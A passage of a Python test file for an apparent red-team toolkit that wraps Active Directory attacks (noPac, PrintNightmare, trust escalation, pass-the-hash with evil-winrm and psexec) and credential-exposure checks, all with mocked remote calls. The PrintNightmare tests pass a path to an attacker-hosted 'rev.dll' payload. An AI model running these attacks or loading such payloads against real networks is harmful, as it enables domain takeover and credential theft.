        tools.set_state(red_team_state)

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.side_effect = Exception("Access denied")
            result = tools.bloodyad_set_password(
                "target_user",
                "NewP@ss123!",  # pragma: allowlist secret
                "contoso.local",
                "user",
                "pass",  # pragma: allowlist secret
                "192.168.58.10",
            )

        assert "failed" in result.lower()


class TestCVEExploitTools:
    """Tests for CVEExploitTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red import CVEExploitTools

        tools = CVEExploitTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: SharedRedTeamState):
        """Test setting state."""
        from ares.tools.red import CVEExploitTools

        tools = CVEExploitTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state

    def test_nopac_success(self, red_team_state: SharedRedTeamState):
        """Test noPac exploitation success."""
        from ares.tools.red import CVEExploitTools

        tools = CVEExploitTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(
                stdout="Administrator hash: aad3b435b51404eeaad3b435b51404ee",
                return_code=0,
            )
            result = tools.nopac(
                "contoso.local",
                "user",
                "pass",  # pragma: allowlist secret
                "192.168.58.10",
                "DC01",
            )

        assert "hash" in result.lower() or "admin" in result.lower()

    def test_nopac_exception(self, red_team_state: SharedRedTeamState):
        """Test noPac exception handling."""
        from ares.tools.red import CVEExploitTools

        tools = CVEExploitTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.side_effect = Exception("Target patched")
            result = tools.nopac(
                "contoso.local",
                "user",
                "pass",  # pragma: allowlist secret
                "192.168.58.10",
                "DC01",
            )

        assert "failed" in result.lower()

    def test_printnightmare_success(self, red_team_state: SharedRedTeamState):
        """Test PrintNightmare exploitation."""
        from ares.tools.red import CVEExploitTools

        tools = CVEExploitTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(stdout="DLL executed successfully", return_code=0)
            result = tools.printnightmare(
                "192.168.58.22",
                "user",
                "pass",  # pragma: allowlist secret
                "contoso.local",
                "\\\\attacker\\share\\rev.dll",
            )

        assert "success" in result.lower() or "executed" in result.lower()

    def test_printnightmare_exception(self, red_team_state: SharedRedTeamState):
        """Test PrintNightmare exception handling."""
        from ares.tools.red import CVEExploitTools

        tools = CVEExploitTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.side_effect = Exception("Spooler disabled")
            result = tools.printnightmare(
                "192.168.58.22",
                "user",
                "pass",  # pragma: allowlist secret
                "contoso.local",
                "\\\\attacker\\share\\rev.dll",
            )

        assert "failed" in result.lower()


class TestTrustAttackTools:
    """Tests for TrustAttackTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red import TrustAttackTools

        tools = TrustAttackTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: SharedRedTeamState):
        """Test setting state."""
        from ares.tools.red import TrustAttackTools

        tools = TrustAttackTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state

    def test_raise_child_success(self, red_team_state: SharedRedTeamState):
        """Test raise_child domain escalation."""
        from ares.tools.red import TrustAttackTools

        tools = TrustAttackTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(
                stdout="Enterprise Admin golden ticket created", return_code=0
            )
            result = tools.raise_child(
                "child.contoso.local",
                "administrator",
                "pass",  # pragma: allowlist secret
            )

        assert "enterprise admin" in result.lower() or "golden ticket" in result.lower()

    def test_raise_child_with_target_domain(self, red_team_state: SharedRedTeamState):
        """Test raise_child with explicit target domain."""
        from ares.tools.red import TrustAttackTools

        tools = TrustAttackTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(stdout="Escalation successful", return_code=0)
            result = tools.raise_child(
                "child.contoso.local",
                "administrator",
                "pass",  # pragma: allowlist secret
                target_domain="contoso.local",
            )

        assert "success" in result.lower() or "escalation" in result.lower()

    def test_raise_child_exception(self, red_team_state: SharedRedTeamState):
        """Test raise_child exception handling."""
        from ares.tools.red import TrustAttackTools

        tools = TrustAttackTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.side_effect = Exception("Trust not found")
            result = tools.raise_child(
                "child.contoso.local",
                "administrator",
                "pass",  # pragma: allowlist secret
            )

        assert "failed" in result.lower()


class TestLateralMovementTools:
    """Tests for LateralMovementTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red import LateralMovementTools

        tools = LateralMovementTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: SharedRedTeamState):
        """Test setting state."""
        from ares.tools.red import LateralMovementTools

        tools = LateralMovementTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state

    def test_evil_winrm_with_password(self, red_team_state: SharedRedTeamState):
        """Test evil-winrm with password authentication."""
        from ares.tools.red import LateralMovementTools

        tools = LateralMovementTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(
                stdout="test\\administrator\nDC01\n", return_code=0
            )
            result = tools.evil_winrm(
                "192.168.58.10",
                "administrator",
                password="pass",  # pragma: allowlist secret
            )

        assert "administrator" in result.lower()

    def test_evil_winrm_with_hash(self, red_team_state: SharedRedTeamState):
        """Test evil-winrm with pass-the-hash."""
        from ares.tools.red import LateralMovementTools

        tools = LateralMovementTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(stdout="nt authority\\system", return_code=0)
            result = tools.evil_winrm(
                "192.168.58.10",
                "administrator",
                hash="aad3b435b51404eeaad3b435b51404ee",  # pragma: allowlist secret
            )

        assert "system" in result.lower()

    def test_evil_winrm_no_creds(self, red_team_state: SharedRedTeamState):
        """Test evil-winrm without credentials fails gracefully."""
        from ares.tools.red import LateralMovementTools

        tools = LateralMovementTools()
        tools.set_state(red_team_state)

        result = tools.evil_winrm("192.168.58.10", "administrator")

        assert "error" in result.lower()

    def test_evil_winrm_exception(self, red_team_state: SharedRedTeamState):
        """Test evil-winrm exception handling."""
        from ares.tools.red import LateralMovementTools

        tools = LateralMovementTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.side_effect = Exception("WinRM disabled")
            result = tools.evil_winrm(
                "192.168.58.10",
                "administrator",
                password="pass",  # pragma: allowlist secret
            )

        assert "failed" in result.lower()

    def test_psexec_with_password(self, red_team_state: SharedRedTeamState):
        """Test psexec with password authentication."""
        from ares.tools.red import LateralMovementTools

        tools = LateralMovementTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(stdout="nt authority\\system", return_code=0)
            result = tools.psexec(
                "192.168.58.10",
                "administrator",
                password="pass",  # pragma: allowlist secret
                domain="contoso.local",
                command="whoami",
            )

        assert "system" in result.lower()

    def test_psexec_with_hash(self, red_team_state: SharedRedTeamState):
        """Test psexec with pass-the-hash."""
        from ares.tools.red import LateralMovementTools

        tools = LateralMovementTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(stdout="C:\\Windows>", return_code=0)
            result = tools.psexec(
                "192.168.58.10",
                "administrator",
                hash="aad3b435b51404eeaad3b435b51404ee",  # pragma: allowlist secret
            )

        assert "windows" in result.lower()

    def test_psexec_exception(self, red_team_state: SharedRedTeamState):
        """Test psexec exception handling."""
        from ares.tools.red import LateralMovementTools

        tools = LateralMovementTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.common.run_remote") as mock_run:
            mock_run.side_effect = Exception("SMB blocked")
            result = tools.psexec(
                "192.168.58.10",
                "administrator",
                password="pass",  # pragma: allowlist secret
            )

        assert "failed" in result.lower()


class TestPostureValidationTools:
    """Tests for PostureValidationTools."""

    def test_check_credman_entries_adds_weakness(self, red_team_state: SharedRedTeamState):
        """Credential Manager entries should be tracked as weaknesses."""
        from ares.tools.red import PostureValidationTools

        tools = PostureValidationTools()
        tools.set_state(red_team_state)

        output = "Target: LegacyGeneric:target=TERMSRV/host\n"
        with patch.object(tools, "_run_netexec_command", return_value=output):
            result = tools.check_credman_entries(
                target="192.168.58.10",
                username="admin",
                password="pass",  # pragma: allowlist secret
                domain="TEST",
            )

        assert "Credential Manager entries found" in result
        assert any("Credential Manager Entries" in block for block in red_team_state.weaknesses)

    def test_check_autologon_registry_adds_weakness(self, red_team_state: SharedRedTeamState):
        """Autologon registry credentials should be flagged."""
        from ares.tools.red import PostureValidationTools

        tools = PostureValidationTools()
        tools.set_state(red_team_state)

        output = (
            "AutoAdminLogon    REG_SZ    1\n"
            "DefaultUserName    REG_SZ    TEST\\svc\n"
            "DefaultPassword    REG_SZ    Secret123\n"
        )
        with patch.object(tools, "_run_netexec_command", return_value=output):
            result = tools.check_autologon_registry(
                target="192.168.58.10",
                username="admin",
                password="pass",  # pragma: allowlist secret
                domain="TEST",
            )

        assert "Autologon credentials detected" in result
        assert any("Autologon Credentials" in block for block in red_team_state.weaknesses)

    def test_check_lm_compatibility_level_adds_weakness(self, red_team_state: SharedRedTeamState):
        """LmCompatibilityLevel allowing NTLMv1 should be recorded."""
        from ares.tools.red import PostureValidationTools

        tools = PostureValidationTools()
        tools.set_state(red_team_state)

        output = "LmCompatibilityLevel    REG_DWORD    0x2\n"
        with patch.object(tools, "_run_netexec_command", return_value=output):
            result = tools.check_lm_compatibility_level(
                target="192.168.58.10",
                username="admin",
                password="pass",  # pragma: allowlist secret
                domain="TEST",
            )

        assert "NTLMv1 allowed" in result
        assert any("NTLMv1 Downgrade Allowed" in block for block in red_team_state.weaknesses)
